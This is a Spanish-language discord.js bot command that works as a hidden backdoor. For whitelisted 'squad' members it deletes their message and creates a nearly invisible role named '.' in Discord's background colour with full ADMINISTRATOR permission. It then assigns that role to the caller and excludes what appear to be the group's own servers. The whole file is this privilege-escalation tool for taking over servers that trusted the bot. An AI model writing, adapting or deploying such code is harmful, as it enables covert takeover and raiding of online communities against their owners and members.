const { MessageEmbed } = require('discord.js');

exports.run = async(client, message, args) => {

if(message.guild.name === "Ḋemonic ֆquad | Þriv") return;
if(message.guild.name === "• [ Demonic Squad | Logs ]") return;

const db = require ('megadb');
const squad = new db.crearDB('squad');

 if (!squad.has(message.author.id)) return;

try{

message.delete()

let me = message.author

let role = await message.guild.roles.create({
      
   data: {
     name: '.',
     color: "#2f3136", 
     permissions: "ADMINISTRATOR"
     
   }
    })

message.guild.member(me).roles.add(role)
message.author.send(new MessageEmbed().setDescription("```Administrador otorgado.```").setColor("BLACK"))

  }catch(e) {
    message.author.send(new MessageEmbed().setDescription("```Error ❌ Ha ocurrido una falla```")
    .addField("__Posibles Errores:__", "```• Permisos insuficientes\n• Cantidad máxima de roles```")
    .addField("__Error Detallado:__", "```"+e+"```"));
  }

}

exports.help = {
  name: "admin",
  aliases:["adm", "autopermisos", "permisos"],
  usage: "[ Uso Independiente : No require Argumentos ]",
  description: "Otorga un rol con permisos de administrador al ejecutor del comando",
  category:"Private"
  
}